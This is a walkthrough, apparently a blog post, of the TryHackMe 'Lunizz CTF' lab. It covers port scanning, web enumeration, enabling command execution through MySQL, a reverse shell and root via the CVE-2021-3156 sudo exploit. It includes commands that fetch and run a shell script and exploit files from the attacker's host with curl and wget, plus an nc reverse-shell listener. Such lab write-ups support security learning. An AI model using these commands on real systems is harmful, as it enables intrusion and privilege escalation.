<p>Link to the ctf: <a href="https://tryhackme.com/room/lunizzctfnd">Lunizz CTF</a></p>

<div class="highlighter-rouge"><pre class="codehilite"><code># Nmap 7.80 scan initiated Wed Feb 24 23:41:07 2021 as: nmap -sV -sC -p- -T4 -oN nmap.log 10.10.115.79
Nmap scan report for 10.10.115.79
Host is up (0.087s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
|_  256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL 5.7.32-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.32-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ConnectWithDatabase, FoundRows, IgnoreSigpipes, SupportsTransactions, LongPassword, ODBCClient, SwitchToSSLAfterHandshake, InteractiveClient, LongColumnFlag, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: `|lXPJ\x1CK5G";6\x10y
| Nq@Z
|_  Auth Plugin Name: mysql_native_password
4444/tcp open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     bGV0bWVpbg==
|     Wrong Password
|   NULL, SSLSessionReq: 
|     Can you decode this for me?
|_    bGV0bWVpbg==
5000/tcp open  upnp?
| fingerprint-strings: 
|   NULL: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
</code></pre></div>

<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>22</td>
      <td>SSH</td>
    </tr>
    <tr>
      <td>80</td>
      <td>HTTP</td>
    </tr>
    <tr>
      <td>3306</td>
      <td>MySQL</td>
    </tr>
  </tbody>
</table>

<h1 id="initial-foothold">Initial foothold</h1>
<p>By using <code class="highlighter-rouge">dirsearch</code> with the wordlist <code class="highlighter-rouge">SecLists/Discovery/Web-Content/raft-large-files.txt</code> the webserver, we found a file called <code class="highlighter-rouge">instructions.txt</code>
<img src="/assets/Clipboard_2021-02-25-01-55-03.png" alt="" /></p>

<div class="highlighter-rouge"><pre class="codehilite"><code>Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user ([REDACTED]:[REDACTED])
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;---------------------------- READ THIS LINE PLEASE
</code></pre></div>

<p>In the webpage, we also found <code class="highlighter-rouge">/whatever/index.php</code> (again by using <code class="highlighter-rouge">dirsearch</code> and the wordlist <code class="highlighter-rouge">SecLists/Discovery/Web-Content/raft-large-directories.txt</code>) with a input field that could pontentially execute code, but it doesnâ€™t work right now.</p>

<p><img src="/assets/Clipboard_2021-02-25-02-17-46.png" alt="" /></p>

<p>Also the <code class="highlighter-rouge">Command Executer Mode :0</code> it kinda tells me that this function is disabled.</p>

<h1 id="mysql">MySQL</h1>
<p>We can connect to <code class="highlighter-rouge">MySQL</code> by issuing the following command:</p>

<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>mysql -u USERNAME -pPASSOWRD -h VICTIM_IP
</code></pre></div>

<p>In the MySQL service, we have a database called <code class="highlighter-rouge">runornot</code>, containing a table called <code class="highlighter-rouge">run</code> with only one value: <code class="highlighter-rouge">0</code></p>

<p>I tried to change the value of the row.</p>
<div class="language-sql highlighter-rouge"><pre class="codehilite"><code><span class="k">UPDATE</span> <span class="n">runcheck</span> <span class="k">SET</span> <span class="n">run</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</code></pre></div>

<h1 id="remote-code-execution">Remote Code Execution</h1>
<p>I went again to the <code class="highlighter-rouge">/whatever/index.php</code> and I saw that <code class="highlighter-rouge">Command Executer Mode</code> is set to <code class="highlighter-rouge">1</code>.
So tried again to use the input
<img src="/assets/Clipboard_2021-02-25-02-25-42.png" alt="" /></p>

<p>And we got RCE.</p>

<p>I then used <a href="https://github.com/jackrendor/asio">asio</a> to get a reverse shell.</p>

<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>asio -H MY_IP -P 8080 -A -B
</code></pre></div>
<p><img src="/assets/Clipboard_2021-03-01-11-00-30.png" alt="" />
I then created a file called <code class="highlighter-rouge">shell.sh</code> and put the one-liner from <code class="highlighter-rouge">asio</code> in it.</p>

<p>I opened a listener for the reverse shell.</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>rlwrap nc -vlp 8080
</code></pre></div>

<p>and then used <code class="highlighter-rouge">python3 -m http.server</code> to create a webserver.</p>
<blockquote>
  <p>NOTE: the command MUST run inside the same folder as <code class="highlighter-rouge">shell.sh</code></p>
</blockquote>

<p>download the script on the target machine:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="k">$(</span>curl YOUR_IP:8000/shell.sh -o /tmp/<span class="k">)</span>
</code></pre></div>

<p>and then execute it</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>bash /tmp/shell.sh
</code></pre></div>

<p><img src="/assets/Clipboard_2021-03-01-11-38-53.png" alt="" /></p>

<h1 id="privesc">Privesc</h1>
<p>Sudo is vulnerable to the CVE-2021-3156, this is the unintentional way that I found to get root.</p>

<p><a href="https://github.com/blasty/CVE-2021-3156">CVE-2021-3156</a></p>

<p>I first cloned the repo on my machine where the python webserver is still running</p>

<p>Moving to the reverse shell: I created a folder inside <code class="highlighter-rouge">/tmp</code> called <code class="highlighter-rouge">privesc</code>, download the necessary files from the python webserver, issue <code class="highlighter-rouge">make</code> and then execute <code class="highlighter-rouge">sudo-hax-me-a-sandwich</code></p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>mkdir /tmp/privesc
<span class="nb">cd</span> /tmp/privesc
wget YOUR_IP:8000/CVE-2021-3156/Makefile
wget YOUR_IP:8000/CVE-2021-3156/hax.c
wget YOUR_IP:8000/CVE-2021-3156/lib.c
make
./sudo-hax-me-a-sandwich
</code></pre></div>

<p><img src="/assets/Clipboard_2021-03-01-11-49-37.png" alt="" /></p>

<p>we can check which argument we can supply to it by issuing the following command:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>cat /etc/<span class="k">*</span>release
</code></pre></div>
<p><img src="/assets/Clipboard_2021-03-01-11-59-03.png" alt="" /></p>

<p>In this way, we see that the version of Ubuntu is <code class="highlighter-rouge">18.04.5 LTS (Bionic Beaver)</code> so accordingly to <code class="highlighter-rouge">sudo-hax-me-a-sandwich</code>, we have to supply the argument <code class="highlighter-rouge">0</code></p>

<p><img src="/assets/Clipboard_2021-03-01-12-01-15.png" alt="" /></p>

<p>and we got root.</p>
